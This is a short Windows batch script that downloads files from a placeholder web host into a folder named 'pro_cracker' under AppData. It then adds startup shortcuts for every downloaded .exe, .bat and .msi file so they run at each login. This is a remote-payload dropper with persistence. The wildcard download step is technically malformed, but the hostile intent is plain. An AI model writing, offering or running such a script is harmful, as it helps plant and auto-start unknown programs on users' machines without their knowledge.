@echo off
powershell -command "Invoke-WebRequest -Uri 'http://your-website.com/folder/*' -OutFile '%APPDATA%\pro_cracker\*'"
for %%i in ("%APPDATA%\pro_cracker\*.exe" "%APPDATA%\pro_cracker\*.bat" "%APPDATA%\pro_cracker\*.msi") do (
    powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\'+(Split-Path -Leaf '%%i')+'.lnk');$s.TargetPath='%%i';$s.Save()"
)
